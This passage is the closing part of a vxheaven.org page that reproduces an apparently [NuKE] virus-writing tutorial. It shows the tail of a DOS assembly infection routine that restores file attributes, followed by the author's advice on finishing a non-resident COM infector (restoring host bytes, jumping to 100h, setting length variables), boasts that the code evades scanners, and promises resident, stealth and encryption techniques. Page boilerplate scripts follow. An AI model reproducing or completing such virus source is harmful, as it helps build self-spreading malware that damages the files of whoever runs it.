+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">4301h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>old_att &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;old File Attributes.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Filename...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">;----------------------------- EnD -------------------------------------</span><br/>
+&nbsp;</div>
+<p>Anyhow that's it... Simple no? This source was also used in my ParaSite ][ Virus that is <strong>still</strong> undetectable to date with Scanv85. Anyhow I even made it <strong>more</strong> simpler than my real sources that have to play with the file paths.</p>
+<p>Anyhow theres still work to be done, like you must restore the old data file so it will jump to 100h and run the old file the virus was infected too! Remember to store them in the beginning and then restore them! Anyhow there's a few Variables to be put in like `VirLength' which you should know how to do that also the `CodeLength' that is the VIRUS codes ONLY not counting the Stacks.</p>
+<p>Anyhow This works FINE with a Non-Resident Virus. Because a few statements would have to be edited for TSRs. Anyhow try to use this, it's small neat and fast.</p>
+<p>Anyhow Perhaps next issue I will develop a SIMPLE Ram-Resident virus that infects COMs and EXEs to be released into the next issue! Though I just release this sources for you to <strong>learn</strong>! Rather than putting you name on my virus and releasing another strain on work I worked Hard upon! Anyhow I should release a SIMPLE new Virus source for all you programmers out there! And I will even explain a few stealth Technics like how to hide your program in memory right under the TOM.</p>
+<p>If there's Any Questions you want to know, please ask them I will answer them in the next [NuKE] Releases... I may even release source codes on how to make an Algorithm encryption method! I've developed one on my own, without the V2PX viruses sources... Anyhow it does the job and the formula I developed has an UNLIMITED amount of encryption methods! But since the virus codes have to be SMALL Like close to 2,000 bytes I will limit the formula to about 1,000 different combinations!</p>
+<div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrs01">de</a><a href="/lib/index.php?lang=en&amp;id=vrs01">en</a><a href="/lib/index.php?lang=es&amp;id=vrs01">es</a><a href="/lib/index.php?lang=it&amp;id=vrs01">it</a><a href="/lib/index.php?lang=fr&amp;id=vrs01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrs01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrs01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrs01">ua</a></div>
+</body>
+</html>
